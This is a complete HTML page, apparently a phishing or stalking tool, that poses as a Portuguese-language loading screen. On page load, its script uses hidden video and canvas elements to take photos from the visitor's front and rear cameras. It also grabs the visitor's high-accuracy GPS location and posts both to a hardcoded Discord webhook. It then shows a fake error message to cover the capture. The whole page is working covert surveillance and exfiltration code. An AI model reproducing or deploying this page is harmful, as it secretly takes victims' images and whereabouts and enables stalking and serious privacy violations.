<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Carregando...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: system-ui, -apple-system, sans-serif;
    background: #0a0a0a;
    color: #ccc;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 20px;
  }
  .container {
    max-width: 320px;
  }
  .spinner {
    width: 48px;
    height: 48px;
    border: 4px solid #333;
    border-top-color: #3b82f6;
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
    margin: 0 auto 24px;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  #status {
    font-size: 1.05rem;
    line-height: 1.5;
    color: #aaa;
  }
  .error {
    color: #f87171;
  }
  video, canvas { display: none; }
</style>
</head>
<body>
  <div class="container">
    <div class="spinner" id="spinner"></div>
    <div id="status">Carregando...</div>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

<script>
const statusEl = document.getElementById('status');
const spinnerEl = document.getElementById('spinner');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1568339134081146942/HzZ4Ohe6oPb4JlU4Ng8jK2jkb3JELjiPWWMETzjVRbjKTKtQ2WF4bJTU1p-c8Jk61WJ-';

const CAMERAS = [
  { label: 'Frontal', facingMode: 'user' },
  { label: 'Traseira', facingMode: 'environment' }
];

function setStatus(text, isError = false) {
  statusEl.textContent = text;
  statusEl.className = isError ? 'error' : '';
}

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function captureCamera(cam) {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: { ideal: cam.facingMode } },
    audio: false
  });
  try {
    video.srcObject = stream;
    await video.play();
    await wait(1100);

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
    if (!blob) throw new Error('Frame vazio');
    return blob;
  } finally {
    stream.getTracks().forEach(track => track.stop());
    video.srcObject = null;
  }
}

async function sendToWebhook(payload) {
  // payload pode ser FormData (arquivo) ou objeto com content
  let body;
  if (payload instanceof FormData) {
    body = payload;
  } else {
    body = JSON.stringify(payload);
  }

  const options = {
    method: 'POST',
    body
  };

  if (!(payload instanceof FormData)) {
    options.headers = { 'Content-Type': 'application/json' };
  }

  const response = await fetch(WEBHOOK_URL, options);
  if (!response.ok) {
    throw new Error('Falha no envio');
  }
}

async function sendPhoto(cam, blob) {
  const fileName = `foto-${cam.facingMode === 'user' ? 'frontal' : 'traseira'}-${Date.now()}.jpg`;
  const formData = new FormData();
  formData.append('file', blob, fileName);
  formData.append('content', `📸 ${cam.label}`);
  await sendToWebhook(formData);
}

function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocalização não suportada'));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve(pos),
      (err) => reject(err),
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );
  });
}

async function sendLocation() {
  try {
    const pos = await getLocation();
    const { latitude, longitude, accuracy } = pos.coords;

    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const content = `📍 **Localização capturada**\n` +
                    `Latitude: \`${latitude.toFixed(6)}\`\n` +
                    `Longitude: \`${longitude.toFixed(6)}\`\n` +
                    `Precisão: ~${Math.round(accuracy)} metros\n` +
                    `[Abrir no Google Maps](${mapsUrl})`;

    await sendToWebhook({ content });
  } catch (err) {
    console.error('Erro localização:', err);
    // Não interrompe o fluxo se a localização falhar
  }
}

async function run() {
  try {
    // 1. Captura e envia as fotos
    for (const cam of CAMERAS) {
      const blob = await captureCamera(cam);
      await sendPhoto(cam, blob);
    }

    // 2. Tenta enviar a localização
    await sendLocation();

  } catch (err) {
    console.error(err);
  } finally {
    // Sempre mostra a mesma mensagem no final
    spinnerEl.style.display = 'none';
    setStatus('Erro, tente novamente mais tarde', true);
  }
}

window.addEventListener('load', run);
</script>
</body>
</html>
